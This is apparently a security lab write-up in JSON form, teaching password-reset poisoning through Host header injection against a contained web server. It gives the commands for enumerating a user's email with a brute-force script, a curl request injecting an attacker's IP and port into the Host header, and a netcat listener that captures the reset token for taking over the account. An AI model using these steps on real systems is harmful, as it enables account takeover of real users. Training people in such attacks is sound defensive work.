{"description":"","goal":"<p>The aim of the lab is to exploit the misconfiguration of some web servers that allow an attacker to send a valid reset password email containing a malicious link.</p>\n<p>&nbsp;</p>","solution":"<p>The solution will follow the phases described in the documentation.</p>\n<h1>User Discovery</h1>\n<p>This phase consist in discovering a valid user registered to the web server in order to start the recover password procedure using that account.<br />Using the web server app that is accessible at <span style=\"text-decoration: underline;\">http://webserver</span> you may notice that if you try to login inserting a non existing user, the server will show you an error message saying: &ldquo;The inserted email do not exist&rdquo;.<br />You can use that vulnerability to find a valid user registered to the web server.<br /><br />The approach that will be used is bruteforcing with a dictionary obtained by sending a lot of POST request with different user email versus the server until you found a valid email. <br />You can accomplish this by using a simple python script; luckily for you we already provide a script for doing so, connect with a shell to the attacker machine and reach the <code>/tools</code> folder<br /><code>cd /tools</code><br /><br />In it you will find two files:</p>\n<ul>\n<li><code>email_dictionary</code>: a basic dictionary that will save you hours and hours</li>\n<li><code>find_email.py</code>: the script</li>\n</ul>\n<p>You can have a detailed look of what the script do and require using:<br /><code>python3 find_email.py --help</code><br /><br /><img src=\"https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images/Tutorial_1.png?raw=true\" alt=\"\" width=\"1203\" height=\"291\" /><br /><br />Follow the command to discover a valid user in the lab:<br /><code>python3 find_email.py \\</code><br /><code>--url http://webserver \\</code><br /><code>--form email \\</code><br /><code>--message \"The inserted email do not exist\" \\</code><br /><code>--dictionary email_dictionary</code><br /><br /><br />The above command return the admin123@victimmail.it email address that we will use as victim.<br /><br /><img src=\"https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images/Tutorial_2.png?raw=true\" alt=\"\" width=\"568\" height=\"178\" /></p>\n<h1>Header Injection</h1>\n<p>In the second phase you will use a web server misconfiguration that allow an attacker to change the &ldquo;host&rdquo; parameter contained in header options. The web server during the reset password procedure, will create a link getting the domain from the host field presented in the POST request; normally this field report the server domain (<span style=\"text-decoration: underline;\">http://webserver</span>) but if an attacker send a post request with a modified host parameter (and the web server do not implement the proper checks) he can send authentic reset email with an arbitrary reset password link.<br /><br />In order to start the attack you will first need to intercept and block the reset password request;&nbsp; in order to do that, connect on your browser to <span style=\"text-decoration: underline;\">http://localhost:3000</span> to display the attacker container browser. Now with attacker&rsquo;s browser visit reset password page (navigate to <span style=\"text-decoration: underline;\">http://webserver</span> and press on &ldquo;Forgot Password&rdquo;); right clicking wherever in the reset password page will open you a window; select the &ldquo;Inspect (Q)&rdquo; and navigate to the &ldquo;Network&ldquo; tab in order to look at all the requests sent from the browser (you may need to refresh the page).<br /><br /></p>\n<p><img src=\"https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images/Tutorial_3.png?raw=true\" alt=\"\" width=\"949\" height=\"513\" /></p>\n<p><br />An important tool that firefox browser gives you is the &ldquo;Block URL&rdquo; functionality that ask you to specify an IP address to block all requests coming from and to the specified IP allowing you to view and edit all of them. Just insert <span style=\"text-decoration: underline;\">http://webserver</span> URL and enable the blocking option:<br /><br /><img src=\"https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images/Tutorial_4.png?raw=true\" alt=\"\" width=\"789\" height=\"238\" /><br /><br />Now you&rsquo;re almost ready to launch the attack, in the UI of the page fill the email address with the one that you have obtained in the first phase and click send button.<br />Firefox will block the sent request and will give you the possibility to copy the query as cURL&nbsp; (right click on it &rarr; Copy Value &rarr; Copy as cURL).<br /><br /><img src=\"https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images/Tutorial_5.png?raw=true\" alt=\"\" width=\"1043\" height=\"234\" /><br /><br />Now using a text editor of you choice edit the copied cURL text as follow. <br />You need to add a header host filed; you can add any header row by using the `-H` option so in order to inject the malicious host you need to add `-H 'Host: 192.168.1.13:12345'` to the request. The full modified cURL request is then:<br /><code>curl -H 'Host: 192.168.1.13:12345' \\</code><br /><code>'http://webserver/resetpassword?' \\</code><br /><code>-X POST \\</code><br /><code>-H 'Content-Type: application/x-www-form-urlencoded' \\</code><br /><code>--data-raw 'email=admin123@victimmail.it'</code><br /><br />Note that there could be more header option in the original post request, those are not strictly necessary and has been removed in the provided modified cURL.<br />Executing the above command will send a reset mail sent from web server to the <strong>admin123@victimmail.it</strong> victim email; in the email there will be a malicious link within the reset password button.<br /><br />Lastly, you have added the &ldquo;Host:&rdquo; parameter inserting attackers IP and a custom <code>12345</code> port, but in order to receive the token, you need to launch netcat listening on the specified 12345 port using the following in an attacker shell:<br /><code>nc -lvnp 12345</code><br /><br /><img src=\"https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images/Tutorial_6.png?raw=true\" alt=\"\" width=\"667\" height=\"325\" /></p>\n<h1>Password Reset</h1>\n<p>You are now going to impersonate the victim that open webmail and click on the reset password link, to do that, open the victim webmail directly from the attacker browser (of course this makes no sense at all but makes the lab easy to use) at <span style=\"text-decoration: underline;\">http://victim_mail</span><br /><br />In the victim mail you will be able to see all the email sent from the web server, if you correctly execute the above phases you should be able to see an email and open it:<br /><br /><img src=\"https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images/Tutorial_7.png?raw=true\" alt=\"\" width=\"847\" height=\"429\" /><br /><br />As you can see in the mail there is a button with a link, press that button.<br /><br />Coming back to the attacker shell where you launch netcat you will see the following:<br /><br /><img src=\"https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images/Tutorial_8.png?raw=true\" alt=\"\" width=\"695\" height=\"266\" /><br /><br />You successfully hijack the reset password request to your machine instead of sending it to the web server; as you can see you obtained the token that allow the web server to identify the user that is requesting the password reset; you can now use it to make the web server believe that you are the victim; just copy the entire URL you see in the request and paste it in the web browser:<br /><br /><img src=\"https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images/Tutorial_9.png?raw=true\" alt=\"\" width=\"918\" height=\"496\" /></p>\n<p>Note: in order to be able to paste the url in the attacker container browser you may need to use the KASM VNC clipboard utility that is showed as a panel on the left side of the attacker browser.<br /><br />Press enter and the web server will allow you to set a new password for the admin123 account.<br /><br />Create than a password and use it to login with the admin123@victimmail.it email to see if the attack has been successful.<br /><br />You got it! Victim has been hacked!</p>","readme":"The lab is divided into three phases:\n\n1. User Discovery\n\n    In this phase you will have to discover a valid user registered to the web server in order to start the recover password procedure using that account.\n    \n2. Header Injection\n    \n    You will intercept and edit the recover password request in order to inject the attacker URL; doing so will allow you to send a poisonous email to the victim and if the victim will click on the reset password link you will obtain the unique token identifying the user to reset the password.\n    \n3. Password Reset\n    \n    With token you get from the previous step you will be able to change the password of the victim account and gain access to it.\n    \n\nIf you want to try to solve the lab by yourself there you got some useful informations:\n\n- You can open a virtual browser on the attacker container by reaching [`http://localhost:3000`](http://localhost:3000)\n- You can open a shell on the attacker container\n- The web server is available at [`http://webserver`](`http://webserver`) and is only accessible within the intranet, you can use the attacker browser to reach it\n- The victim mail client is available at [`http://victim_mail`](http://victim_mail) and is only accessible within the intranet, you can use the attacker browser to reach it","author":"marcotammaro"}
